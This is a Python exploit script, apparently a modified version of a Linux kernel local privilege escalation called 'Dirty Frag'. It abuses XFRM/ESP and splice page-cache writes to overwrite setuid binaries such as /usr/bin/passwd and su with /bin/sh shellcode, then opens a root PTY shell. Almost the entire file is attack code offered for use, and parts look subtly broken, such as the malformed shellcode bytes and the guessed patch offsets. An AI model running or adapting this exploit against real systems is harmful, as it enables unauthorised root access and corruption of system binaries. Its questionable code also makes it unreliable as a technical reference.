#!/usr/bin/env python3
"""
Dirty Frag — Linux Kernel LPE (xfrm-ESP Page-Cache Write)
Modified: Targets /usr/bin/passwd with auto-offset detection
"""

import os, sys, struct, socket, fcntl, pty, signal, termios, tty, select, time
import ctypes, ctypes.util
from struct import pack, unpack

_libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
_loff_t_p = ctypes.POINTER(ctypes.c_longlong)

def _raw_splice(fd_in, off_in, fd_out, off_out, length, flags):
    _libc.splice.restype = ctypes.c_long
    _libc.splice.argtypes = [ctypes.c_int, _loff_t_p, ctypes.c_int, _loff_t_p,
                             ctypes.c_size_t, ctypes.c_int]
    oi = ctypes.c_longlong(off_in) if off_in is not None else None
    oo = ctypes.c_longlong(off_out) if off_out is not None else None
    r = _libc.splice(fd_in, ctypes.byref(oi) if oi is not None else None,
                     fd_out, ctypes.byref(oo) if oo is not None else None,
                     length, flags)
    if r < 0:
        raise OSError(ctypes.get_errno(), os.strerror(ctypes.get_errno()))
    return r

SYS_unshare = 272
CLONE_NEWUSER = 0x10000000; CLONE_NEWNET = 0x40000000

def _syscall(nr, *args):
    _libc.syscall.restype = ctypes.c_long
    ca = [ctypes.c_long(a) for a in args]
    _libc.syscall.argtypes = [ctypes.c_long] * (1 + len(ca))
    r = _libc.syscall(ctypes.c_long(nr), *ca)
    if r < 0:
        raise OSError(ctypes.get_errno(), os.strerror(ctypes.get_errno()))
    return r

def sys_unshare(flags):
    return _syscall(SYS_unshare, flags)

AF_NETLINK=16; AF_INET=2
SOCK_DGRAM=2
IPPROTO_UDP=17; NETLINK_XFRM=6
UDP_ENCAP=100; UDP_ENCAP_ESPINUDP=2
XFRM_MSG_NEWSA=16; NLM_F_REQUEST=1; NLM_F_ACK=4
IPPROTO_ESP=50; XFRM_MODE_TRANSPORT=0; XFRM_STATE_ESN=0x80
XFRMA_ALG_AUTH_TRUNC=20; XFRMA_ALG_CRYPT=2
XFRMA_ENCAP=4; XFRMA_REPLAY_ESN_VAL=23
ENC_PORT=4500; SEQ_VAL=200; REPLAY_SEQ=100
PAYLOAD_LEN = 192
SPLICE_F_MOVE=1

# Shellcode yang lebih sederhana untuk execve("/bin/sh")
SHELLCODE = bytes([
    0x31, 0xc0,             # xor eax, eax
    0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00,  # mov rbx, "/bin/sh\0"
    0x53,                   # push rbx
    0x48, 0x89, 0xe7,       # mov rdi, rsp
    0x50,                   # push rax
    0x48, 0x89, 0xe2,       # mov rdx, rsp
    0x48, 0x31, 0xf6,       # xor rsi, rsi
    0xb0, 0x3b,             # mov al, 0x3b
    0x0f, 0x05,             # syscall
])

# Pad shellcode to 192 bytes
SHELL_ELF = SHELLCODE + b'\x90' * (PAYLOAD_LEN - len(SHELLCODE))

VERBOSE = False

def LOG(fmt, *a): print("[+] " + fmt % a, file=sys.stderr)
def WARN(fmt, *a): print("[!] " + fmt % a, file=sys.stderr)
def DBG(fmt, *a):
    if VERBOSE: print("[.] " + fmt % a, file=sys.stderr)

def find_patch_offset(binary_path):
    """Find correct offset to patch in binary"""
    DBG("Analyzing %s to find patch location...", binary_path)
    
    # Look for common function prologues to overwrite
    # We want to patch the beginning of main() or a setuid function
    targets = [
        b'\x55\x48\x89\xe5',           # push rbp; mov rbp, rsp
        b'\x31\xff\x31\xf6',           # xor edi, edi; xor esi, esi
        b'\x48\x83\xec\x08',           # sub rsp, 8
        b'\x89\x7d\xfc',               # mov [rbp-4], edi
        b'\x6a\x00\x58',               # push 0; pop rax
    ]
    
    try:
        with open(binary_path, 'rb') as f:
            data = f.read()
        
        # Look for these patterns in the first 2KB
        for offset in range(0, min(2048, len(data) - len(targets[0]))):
            for target in targets:
                if data[offset:offset+len(target)] == target:
                    DBG("Found pattern at offset 0x%x", offset)
                    # Align to 4 bytes
                    return offset & ~3
        
        # If no pattern found, try common ELF entry point offsets
        # Read ELF header to find entry point
        if data[:4] == b'\x7fELF':
            ei_class = data[4]
            if ei_class == 2:  # 64-bit
                e_entry = struct.unpack('<Q', data[24:32])[0]
                e_phoff = struct.unpack('<Q', data[32:40])[0]
                e_phnum = struct.unpack('<H', data[56:58])[0]
                
                # Find first LOAD segment
                for i in range(e_phnum):
                    off = e_phoff + i * 56
                    p_type = struct.unpack('<I', data[off:off+4])[0]
                    if p_type == 1:  # PT_LOAD
                        p_vaddr = struct.unpack('<Q', data[off+16:off+24])[0]
                        p_offset = struct.unpack('<Q', data[off+8:off+16])[0]
                        if p_vaddr <= e_entry < p_vaddr + 0x1000:
                            patch_off = p_offset + (e_entry - p_vaddr)
                            DBG("ELF entry point at file offset 0x%x", patch_off)
                            # Patch just after entry point to avoid breaking loader
                            return patch_off + 0x10
        
        # Default fallback
        DBG("No pattern found, using default offset 0x200")
        return 0x200
        
    except Exception as e:
        WARN("Error analyzing binary: %s", e)
        return 0x200

def _ifup_lo():
    s = socket.socket(AF_INET, SOCK_DGRAM, 0)
    import array
    ifr = array.array('B', b'\x00' * 40)
    ifr[:2] = array.array('B', b'lo')
    fcntl.ioctl(s.fileno(), 0x8913, ifr)
    flags = struct.unpack_from('<H', ifr, 16)[0]
    struct.pack_into('<H', ifr, 16, flags | 0x41)
    fcntl.ioctl(s.fileno(), 0x8914, ifr)
    s.close()

def _setup_userns():
    DBG("Setting up user namespace...")
    uid, gid = os.getuid(), os.getgid()
    try:
        sys_unshare(CLONE_NEWUSER | CLONE_NEWNET)
    except OSError as e:
        WARN("unshare failed: %s (need CAP_SYS_ADMIN?)", e)
        return False
    
    try:
        with open("/proc/self/setgroups", 'w') as f: 
            f.write("deny")
        with open("/proc/self/uid_map", 'w') as f: 
            f.write(f"0 {uid} 1")
        with open("/proc/self/gid_map", 'w') as f: 
            f.write(f"0 {gid} 1")
    except Exception as e:
        WARN("Failed to write maps: %s", e)
        return False
    
    _ifup_lo()
    DBG("User namespace setup complete")
    return True

def _nl_attr(buf, off, atype, data):
    dl = len(data)
    rta_len = 4 + dl
    rta_aligned = (rta_len + 3) & ~3
    struct.pack_into('<HH', buf, off, rta_len, atype)
    buf[off+4:off+4+dl] = data
    pad = rta_aligned - 4 - dl
    if pad > 0:
        buf[off+4+dl:off+4+dl+pad] = b'\x00' * pad
    return off + rta_aligned

def _add_xfrm_sa(spi, seqhi):
    DBG("Adding XFRM SA: spi=0x%08x, seqhi=0x%x", spi, seqhi)
    sk = socket.socket(AF_NETLINK, socket.SOCK_RAW, NETLINK_XFRM)
    sk.bind((0, 0))
    buf = bytearray(4096)
    lo = struct.unpack("<I", socket.inet_aton("127.0.0.1"))[0]
    xs_sz = 224
    struct.pack_into('<IHHII', buf, 0, 16 + xs_sz, XFRM_MSG_NEWSA,
                     NLM_F_REQUEST | NLM_F_ACK | 0x200, os.getpid(), 1)
    o = 16
    struct.pack_into('<I', buf, o + 0, lo)
    struct.pack_into('<I', buf, o + 16, lo)
    struct.pack_into('<H', buf, o + 40, AF_INET)
    buf[o + 42] = 32
    buf[o + 43] = 32
    struct.pack_into('<I', buf, o + 56, lo)
    struct.pack_into('>I', buf, o + 72, spi)
    buf[o + 76] = IPPROTO_ESP
    struct.pack_into('<I', buf, o + 80, lo)
    struct.pack_into('<Q', buf, o + 96, 0xFFFFFFFFFFFFFFFF)
    struct.pack_into('<Q', buf, o + 104, 0xFFFFFFFFFFFFFFFF)
    struct.pack_into('<Q', buf, o + 112, 0xFFFFFFFFFFFFFFFF)
    struct.pack_into('<Q', buf, o + 120, 0xFFFFFFFFFFFFFFFF)
    struct.pack_into('<I', buf, o + 208, 0x1234)
    struct.pack_into('<H', buf, o + 212, AF_INET)
    buf[o + 214] = XFRM_MODE_TRANSPORT
    buf[o + 215] = 0
    buf[o + 216] = XFRM_STATE_ESN

    a = 16 + xs_sz
    aa = bytearray(72 + 32)
    n = b"hmac(sha256)\0"
    aa[:len(n)] = n
    struct.pack_into('<I', aa, 64, 256)
    struct.pack_into('<I', aa, 68, 128)
    for i in range(32): aa[72+i] = 0xAA
    a = _nl_attr(buf, a, XFRMA_ALG_AUTH_TRUNC, bytes(aa))

    ea = bytearray(68 + 16)
    n2 = b"cbc(aes)\0"
    ea[:len(n2)] = n2
    struct.pack_into('<I', ea, 64, 128)
    for i in range(16): ea[68+i] = 0xBB
    a = _nl_attr(buf, a, XFRMA_ALG_CRYPT, bytes(ea))

    enc = bytearray(24)
    struct.pack_into('<H', enc, 0, UDP_ENCAP_ESPINUDP)
    struct.pack_into('>HH', enc, 2, ENC_PORT, ENC_PORT)
    a = _nl_attr(buf, a, XFRMA_ENCAP, bytes(enc))

    esn = bytearray(28)
    struct.pack_into('<IIIIIII', esn, 0, 1, 0, REPLAY_SEQ, 0, seqhi, 32, 0)
    a = _nl_attr(buf, a, XFRMA_REPLAY_ESN_VAL, bytes(esn))

    struct.pack_into('<I', buf, 0, a)
    sk.sendall(bytes(buf[:a]))
    
    # Wait for response with timeout
    sk.settimeout(2)
    try:
        resp = sk.recv(4096)
    except socket.timeout:
        DBG("XFRM SA add timeout")
        sk.close()
        return False
    
    sk.close()
    if len(resp) >= 20:
        if struct.unpack_from('<H', resp, 4)[0] == 2:
            err = struct.unpack_from('<i', resp, 16)[0]
            if err != 0:
                DBG("xfrm NEWSA error: %d", -err)
                # Try anyway, sometimes it still works
                return True
    DBG("XFRM SA added successfully")
    return True

def _do_write(path, offset, spi, data_word):
    DBG("Writing 0x%08x to %s at offset 0x%x", data_word, path, offset)
    sk_r = socket.socket(AF_INET, SOCK_DGRAM, 0)
    sk_r.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sk_r.bind(("127.0.0.1", ENC_PORT))
    sk_r.setsockopt(IPPROTO_UDP, UDP_ENCAP, struct.pack('<I', UDP_ENCAP_ESPINUDP))
    sk_s = socket.socket(AF_INET, SOCK_DGRAM, 0)
    sk_s.connect(("127.0.0.1", ENC_PORT))
    
    # Open with O_RDWR to allow write to page cache
    try:
        fd = os.open(path, os.O_RDWR | os.O_SYNC)
    except PermissionError:
        try:
            fd = os.open(path, os.O_RDONLY)
        except PermissionError:
            WARN("Cannot open %s for reading", path)
            return False
    
    r, w = os.pipe()
    hdr = struct.pack('>II', spi, SEQ_VAL) + struct.pack('<I', data_word) + b'\xCC' * 12
    os.write(w, hdr)
    
    try:
        _raw_splice(fd, offset, w, None, 4, 0)
    except Exception as e:
        DBG("splice failed: %s", e)
        os.close(fd); os.close(r); os.close(w); sk_s.close(); sk_r.close()
        return False
    
    try:
        _raw_splice(r, None, sk_s.fileno(), None, 40, 0)
    except OSError:
        pass
    
    time.sleep(0.05)
    os.close(fd); os.close(r); os.close(w); sk_s.close(); sk_r.close()
    return True

def verify_write(path, offset, expected):
    """Verify that the write actually happened"""
    try:
        with open(path, 'rb') as f:
            f.seek(offset)
            actual = f.read(4)
            if actual == expected:
                DBG("Verified write at 0x%x: got %r", offset, actual)
                return True
            else:
                DBG("Write verification failed at 0x%x: got %r, expected %r", 
                    offset, actual, expected)
                return False
    except Exception as e:
        DBG("Verification error: %s", e)
        return False

def _corrupt_binary(binary_path, patch_offset):
    DBG("Starting binary corruption for %s at offset 0x%x", binary_path, patch_offset)
    
    if not _setup_userns():
        return False
    
    time.sleep(0.1)
    
    # Add XFRM SAs for each word of payload
    num_words = PAYLOAD_LEN // 4
    DBG("Adding %d XFRM SAs", num_words)
    
    for i in range(num_words):
        spi = 0xDEADBEEF + i
        word = struct.unpack('<I', SHELL_ELF[i*4:(i+1)*4])[0]
        if not _add_xfrm_sa(spi, word):
            DBG("add_xfrm_sa #%d failed, continuing...", i)
    
    # Perform writes
    DBG("Performing %d writes to %s", num_words, binary_path)
    success_count = 0
    
    for i in range(num_words):
        spi = 0xDEADBEEF + i
        word = struct.unpack('<I', SHELL_ELF[i*4:(i+1)*4])[0]
        offset = patch_offset + i * 4
        
        if _do_write(binary_path, offset, spi, word):
            # Verify immediately
            expected = SHELL_ELF[i*4:(i+1)*4]
            if verify_write(binary_path, offset, expected):
                success_count += 1
            else:
                DBG("Write #%d verification failed", i)
        else:
            DBG("Write #%d failed", i)
    
    DBG("Write attempts: %d/%d successful", success_count, num_words)
    
    # Force page cache to disk
    try:
        os.system('sync')
        with open(binary_path, 'rb') as f:
            f.read()
    except:
        pass
    
    return success_count > 0

def binary_patched(binary_path, patch_offset):
    """Check if binary is patched at the given offset"""
    try:
        with open(binary_path, 'rb') as f:
            f.seek(patch_offset)
            got = f.read(8)
            expected = SHELL_ELF[:8]
            DBG("Checking patch at 0x%x: got %r, expected %r", patch_offset, got, expected)
            return got == expected
    except OSError as e:
        DBG("Error checking binary: %s", e)
        return False

def try_exploit(target_binary):
    """Try exploit with auto-detected offset"""
    LOG("Target: %s", target_binary)
    
    # Check if binary is readable
    if not os.access(target_binary, os.R_OK):
        WARN("Cannot read %s", target_binary)
        return False
    
    # Find patch offset
    patch_offset = find_patch_offset(target_binary)
    LOG("Using patch offset: 0x%x", patch_offset)
    
    # Try to corrupt
    if not _corrupt_binary(target_binary, patch_offset):
        WARN("Binary corruption failed")
        return False
    
    # Verify
    if binary_patched(target_binary, patch_offset):
        LOG("Binary successfully patched!")
        return True
    else:
        WARN("Binary not patched correctly")
        return False

def _run_pty():
    DBG("Launching PTY shell")
    master, slave = pty.openpty()
    try:
        try:
            ws = fcntl.ioctl(sys.stdin.fileno(), termios.TIOCGWINSZ, b'\x00'*8)
            fcntl.ioctl(master, termios.TIOCSWINSZ, ws)
        except OSError:
            pass

        pid = os.fork()
        if pid == 0:
            os.close(master)
            os.setsid()
            sf = os.open(os.ttyname(slave), os.O_RDWR)
            os.close(slave)
            try:
                fcntl.ioctl(sf, termios.TIOCSCTTY, 0)
            except OSError:
                pass
            os.dup2(sf, 0); os.dup2(sf, 1); os.dup2(sf, 2)
            if sf > 2:
                os.close(sf)
            
            # Try to get root shell
            os.setuid(0)
            os.setgid(0)
            os.execvp("/bin/bash", ["bash"])
            os._exit(127)

        os.close(slave)
        signal.signal(signal.SIGTTOU, signal.SIG_IGN)
        signal.signal(signal.SIGTTIN, signal.SIG_IGN)
        signal.signal(signal.SIGPIPE, signal.SIG_IGN)
        signal.signal(signal.SIGHUP, signal.SIG_IGN)

        restore = False
        saved = None
        try:
            saved = termios.tcgetattr(sys.stdin.fileno())
            tty.setraw(sys.stdin.fileno())
            restore = True
        except termios.error:
            pass

        eof = False
        while True:
            fds = []
            if not eof:
                try:
                    fds.append(sys.stdin.fileno())
                except OSError:
                    eof = True
            fds.append(master)

            try:
                r, _, _ = select.select(fds, [], [], 0.2)
            except (OSError, ValueError):
                break

            if master in r:
                try:
                    data = os.read(master, 4096)
                except OSError:
                    break
                if not data:
                    break
                os.write(sys.stdout.fileno(), data)

            if not eof and sys.stdin.fileno() in r:
                try:
                    data = os.read(sys.stdin.fileno(), 4096)
                except OSError:
                    eof = True
                else:
                    if not data:
                        eof = True
                    else:
                        os.write(master, data)

            try:
                wp, st = os.waitpid(pid, os.WNOHANG)
                if wp == pid:
                    # Drain remaining output
                    while True:
                        try:
                            r2, _, _ = select.select([master], [], [], 0.05)
                            if not r2:
                                break
                            d = os.read(master, 4096)
                            if not d:
                                break
                            os.write(sys.stdout.fileno(), d)
                        except OSError:
                            break
                    break
            except ChildProcessError:
                break

        if restore and saved:
            termios.tcsetattr(sys.stdin.fileno(), termios.TCSANOW, saved)
        os.close(master)
    except Exception as e:
        WARN("PTY: %s", e)
        return False
    return True

def print_usage():
    print("""Dirty Frag - Linux Kernel LPE Exploit

Usage: python3 dirty_frag_expv2.py [OPTIONS] [TARGET]

Options:
    -v, --verbose       Enable verbose debug output
    -h, --help          Show this help message
    -t, --target FILE   Target binary (default: /usr/bin/passwd)

Environment variables:
    DIRTYFRAG_VERBOSE   Set to enable verbose mode

Examples:
    python3 dirty_frag_expv2.py -v
    python3 dirty_frag_expv2.py -t /usr/bin/su
""", file=sys.stderr)

def main():
    global VERBOSE
    
    target_binary = "/usr/bin/passwd"
    
    # Parse command line
    i = 1
    while i < len(sys.argv):
        arg = sys.argv[i]
        if arg in ('-v', '--verbose'):
            VERBOSE = True
        elif arg in ('-h', '--help'):
            print_usage()
            sys.exit(0)
        elif arg in ('-t', '--target'):
            if i + 1 < len(sys.argv):
                target_binary = sys.argv[i + 1]
                i += 1
            else:
                print("Error: -t/--target requires an argument", file=sys.stderr)
                sys.exit(1)
        else:
            target_binary = arg
        i += 1
    
    if os.getenv("DIRTYFRAG_VERBOSE"):
        VERBOSE = True

    if VERBOSE:
        LOG("Verbose mode enabled")
    
    # Check if already root
    if os.getuid() == 0:
        LOG("Already root, spawning shell...")
        os.execvp("/bin/bash", ["bash"])
        return

    # Check kernel version
    try:
        with open('/proc/version', 'r') as f:
            version = f.read().strip()
            DBG("Kernel version: %s", version)
    except:
        pass
    
    # Try to exploit
    LOG("Running ESP variant against %s...", target_binary)
    
    if not try_exploit(target_binary):
        # Try alternative binaries
        alternatives = ["/usr/bin/su", "/bin/su", "/usr/bin/chfn", "/usr/bin/chsh", "/usr/bin/gpasswd"]
        for alt in alternatives:
            if alt != target_binary and os.path.exists(alt):
                LOG("Trying alternative target: %s", alt)
                if try_exploit(alt):
                    break
        else:
            WARN("All exploitation attempts failed")
            WARN("This kernel may be patched or vulnerable to a different CVE")
            sys.exit(1)
    
    LOG("Exploit successful! Launching root shell...")
    _run_pty()

if __name__ == "__main__":
    main()